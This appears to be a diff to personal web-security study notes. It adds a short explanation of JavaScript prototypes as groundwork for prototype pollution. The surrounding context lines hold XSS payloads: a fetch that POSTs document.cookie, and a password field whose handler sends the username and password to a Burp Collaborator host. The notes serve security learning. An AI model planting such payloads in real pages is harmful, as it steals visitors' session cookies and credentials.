@@ -229,6 +229,21 @@ method:"POST","mode": "no-cors", body:document.cookie,
 <input name=pass id=pass 
 onchange="if(this.value.length)fetch('https://f4kkxbyzq4mvh4v1wxaaquoq3h99xy.burpcollaborator.net', {method: 'POST', mode:'no-cors',body: user.value+' '+this.value}),">
 
+### Prototype Pollution
+  - https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance
+  - Objects in js is key value pair
+  - ```const user =  {
+    username: "wiener",
+    userId: 01234,
+    exampleMethod: function(){
+        // do something
+    }
+}```
+   - Every object is linked to another object, and that object is linked to another object, untill null.
+   - Ex: in JS, String are autoassign `String.prototype`. This becomes helpful, because a lot of methods like `Trim()` are in that prototype so string object can use them directly.
+   - JavaScript engine first tries to access this directly on the object itself. If the object doesn't have a matching property, the JavaScript engine looks for it on the object's prototype instead.
+   - Although this doesn't have a formally standardized name, __proto__ is the de facto standard used by most browsers
+
 ### SSRF
  - places to look for
    - When a full URL is used in a parameter in the address bar:
